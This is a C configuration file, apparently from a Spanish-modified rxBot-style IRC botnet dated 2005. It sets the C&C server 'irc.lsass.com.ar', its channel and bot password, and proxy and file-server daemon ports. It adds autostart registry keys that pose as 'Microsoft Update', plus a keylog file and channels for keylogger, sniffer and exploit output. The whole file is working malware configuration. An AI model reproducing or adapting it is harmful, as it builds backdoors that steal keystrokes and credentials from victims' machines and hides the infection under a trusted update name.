/*****************************************************************************/
/*                                Morgan Copy Right 2005 
/*****************************************************************************/  
// Asn agregado por Morgan 
// irc.lsass.com.ar #Lsass
// configuracion del bot (sin encriptar)
int port = 6667;				// server port
int port2 = 6667;				// backup server port
int socks4port = 12221;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int ftpport = 45341;            // Port # for ftpd daemon to run on
int httpport = 2001;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '!';				// command prefix (one character max.)
int maxrand = 7;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.txt";
#endif

#ifndef NO_CRYPT // se recomienda encriptar ..

#else  // esto es inseguro . encriptalo :

char botid[] = "rx01";						// bot id
char version[] = ".[.A.sn..r00t3d...FTP..by..M.organ]"; // Bots !version reply
char password[] = "morgan";					// bot password
char server[] = "irc.lsass.com.ar";		    // server
char serverpass[] = "";						// server password
char channel[] = "#lsass#";				    // channel that the bot should join
char chanpass[] = "lsass";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "bling.exe";			// destination file name
char keylogfile[] = "keys.txt";				// keylog filename
char valuename[] = "Microsoft Update";		// value name for autostart
char nickconst[] = "morgan|";					    // uses rndnick
char szLocalPayloadFile[]="msconfig.data";	// Payload filename
char modeonconn[] = "-x";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#exploit#";				// Channel where exploit messages get redirected
char keylogchan[] = "#keylog#";				// Channel where keylog messages get redirected
char psniffchan[] = "#sniff#";				// Channel where psniff messages get redirected 

char *authost[] = {
	"*@*",
	
};

char *versionlist[] = {
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey",
	"mIRC v6.16 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2poiwsfpf3213ew"; // Cambia esto
#endif
